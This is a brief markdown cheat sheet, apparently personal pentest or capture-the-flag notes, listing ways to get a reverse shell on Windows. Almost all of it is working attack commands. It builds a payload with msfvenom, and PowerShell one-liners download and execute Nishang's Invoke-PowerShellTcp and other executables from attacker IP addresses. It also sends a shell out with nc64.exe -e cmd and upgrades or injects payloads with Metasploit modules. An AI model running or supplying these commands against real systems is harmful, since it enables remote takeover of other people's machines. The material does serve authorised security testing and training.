# Reverse Shell

## Batch file

```
msfvenom -p cmd/windows/reverse_powershell lhost=192.168.1.109 lport=4444 > 1.bat

powershell -c "IEX((New-Object System.Net.WebClient).DownloadString('http://192.168.1.109/1.bat'))
```

## Nishang / Powershell

Retrieve Invoke-PowerShellTcp.ps1 from the Nishang collection.

Edit the script and add the execution line at the end with IP and PORT

```
c:\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe IEX(New-Object Net.WebClient).downloadString('http://IP/Invoke-PoweShellTcp.ps1')
```

### Powershell download and execution

```
powershell iex (New-Object Net.WebClient).DownloadString('http://10.8.20.45:8000/PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.8.20.45 -Port 9000
```

```
powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.11.9.134:8000/bruce.exe','bruce.exe')"
```

```
powershell -c "Invoke-WebRequest -Uri 'http://10.11.9.134:8000/bruce.exe' -OutFile 'C:\Windows\Temp\shell.exe'"
```

```
.\shell.exe
or
PS> & 'msdeploy.exe'
```

## Netcat reverse shell

Upload nc.exe onto the target's machine (take note if 32 or 64 bits)

```
nc64.exe -e cmd IP PORT
```

## Upgrade shell

### MSFconsole

```
use multi/manage/shell_to_meterpreter

or 

use exploit/windows/local/payload_inject
```